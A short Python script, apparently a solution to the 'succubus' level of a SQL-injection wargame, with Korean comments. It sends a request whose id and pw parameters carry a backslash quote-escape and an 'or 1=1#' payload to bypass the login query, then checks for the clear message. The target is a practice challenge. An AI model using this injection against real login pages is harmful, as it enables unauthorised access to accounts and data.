#서큐버스라서 섹시하다.
import requests
from dotenv import load_dotenv
import os

load_dotenv()
#python 환경이 아니면 \을 이스케이프시켜줄 필요는 없다. 
url=os.environ.get('LOS_URL')+'chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?id=admin\\&pw=or%201=1%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "SUCCUBUS Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)